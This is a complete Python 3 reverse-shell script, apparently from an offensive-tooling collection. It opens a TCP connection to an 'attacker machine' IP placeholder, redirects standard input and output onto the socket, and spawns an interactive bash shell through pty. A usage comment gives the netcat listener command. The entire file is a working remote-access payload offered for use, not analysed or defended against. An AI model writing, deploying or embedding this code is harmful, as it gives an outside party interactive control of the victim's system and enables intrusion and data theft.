#!/usr/bin/python3

""" Python 3.6 Linux Reverse PTY Shell """

# Usage: nc -lvp 12345 in the attacker machine to set up the listener

import sys
import socket
import os
import pty

HOST = "xx.xx.xx.xx"  # Enter the attacker machine IP address
PORT = "12345"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST,int(PORT)))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
pty.spawn('/bin/bash')


